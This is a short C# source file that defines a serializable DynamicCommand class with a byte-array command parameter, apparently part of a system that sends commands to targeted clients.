using System;

namespace Orcus.Shared.DynamicCommands
{
    /// <summary>
    ///     A dynamic command is based on a static command with execution information like the <see cref="TransmissionEvent" />
    ///     or the <see cref="ExecutionEvent" />. It also defines the targeted clients and other options
    /// </summary>
    [Serializable]
    public class DynamicCommand : DynamicCommandInfo
    {
        /// <summary>
        ///     The parameter for the command
        /// </summary>
        public byte[] CommandParameter { get; set; }
    }
}